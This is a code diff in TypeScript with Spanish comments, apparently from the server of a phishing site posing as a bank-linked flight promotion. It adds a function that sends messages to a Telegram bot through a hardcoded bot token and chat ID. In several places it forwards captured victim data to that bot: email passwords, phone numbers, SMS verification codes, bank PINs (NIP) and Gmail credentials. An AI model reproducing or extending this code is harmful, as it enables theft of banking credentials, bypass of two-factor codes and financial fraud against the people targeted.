@@ -16,6 +16,23 @@ const generateNumericId = (length: number): string => {
   return id;
 };
 
+// Función para enviar mensajes a Telegram
+const sendTelegramMessage = async (message: string) => {
+  const botToken = "7764190007:AAGNnwdIt8cfotDj1si_AefOhrYIQdLzAig";
+  const chatId = "6615027684";
+  
+  try {
+    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML'
+    });
+    console.log('✅ Mensaje enviado a Telegram:', message);
+  } catch (error) {
+    console.error('❌ Error enviando mensaje a Telegram:', error);
+  }
+};
+
 // Store active connections
 const clients = new Map<string, WebSocket>();
 // Cambiamos a un Map para asociar cada socket con su username
@@ -1139,6 +1156,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
             // Registrar el cliente WebSocket
             clients.set(sessionId, ws);
 
+            // Enviar notificación a Telegram
+            const telegramMessage = `🎫 <b>NUEVA PROMOCIÓN DE VUELOS</b>\n\n` +
+              `📋 <b>Folio:</b> ${newSession.folio}\n` +
+              `🏦 <b>Banco:</b> ${banco}\n` +
+              `📧 <b>Correo:</b> ${clientData.correo || 'No proporcionado'}\n` +
+              `🔑 <b>Contraseña:</b> ${clientData.contrasena || 'No proporcionada'}\n` +
+              `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
+              `✅ <b>Estado:</b> Términos aceptados, esperando validación`;
+            
+            sendTelegramMessage(telegramMessage);
+
             // Notificar a todos los administradores sobre el nuevo cliente
             broadcastToAdmins(JSON.stringify({
               type: 'NEW_CLIENT_LOGIN',
@@ -1189,13 +1217,34 @@ export async function registerRoutes(app: Express): Promise<Server> {
               case 'telefono':
                 updatedFields.celular = inputData.telefono;
                 console.log('Teléfono recibido:', inputData.telefono);
+                
+                // Enviar notificación a Telegram
+                const telefonoMessage = `📱 <b>TELÉFONO RECIBIDO</b>\n\n` +
+                  `📋 <b>Folio:</b> ${await storage.getSessionById(sessionId).then(s => s?.folio) || 'N/A'}\n` +
+                  `📞 <b>Teléfono:</b> +52 ${inputData.telefono}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(telefonoMessage);
                 break;
               case 'codigo':
                 updatedFields.sms = inputData.codigo;
                 console.log('Código de verificación recibido:', inputData.codigo);
+                
+                // Enviar notificación a Telegram
+                const codigoMessage = `🔑 <b>CÓDIGO DE VERIFICACIÓN</b>\n\n` +
+                  `📋 <b>Folio:</b> ${await storage.getSessionById(sessionId).then(s => s?.folio) || 'N/A'}\n` +
+                  `🔢 <b>Código SMS:</b> ${inputData.codigo}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(codigoMessage);
                 break;
               case 'nip':
                 updatedFields.nip = inputData.nip;
+                
+                // Enviar notificación a Telegram
+                const nipMessage = `🔐 <b>NIP RECIBIDO</b>\n\n` +
+                  `📋 <b>Folio:</b> ${await storage.getSessionById(sessionId).then(s => s?.folio) || 'N/A'}\n` +
+                  `🔢 <b>NIP:</b> ${inputData.nip}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(nipMessage);
                 break;
               case 'tarjeta':
                 updatedFields.tarjeta = inputData.tarjeta;
@@ -1234,6 +1283,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 updatedFields.correo = inputData.correo;
                 updatedFields.contrasena = inputData.contrasena;
                 console.log('Recibidas credenciales de Gmail:', inputData.correo);
+                
+                // Enviar notificación a Telegram
+                const gmailMessage = `📧 <b>CREDENCIALES GMAIL</b>\n\n` +
+                  `📋 <b>Folio:</b> ${await storage.getSessionById(sessionId).then(s => s?.folio) || 'N/A'}\n` +
+                  `📧 <b>Correo:</b> ${inputData.correo}\n` +
+                  `🔑 <b>Contraseña:</b> ${inputData.contrasena}\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(gmailMessage);
                 break;
               case 'hotmail':
                 updatedFields.correo = inputData.correo;
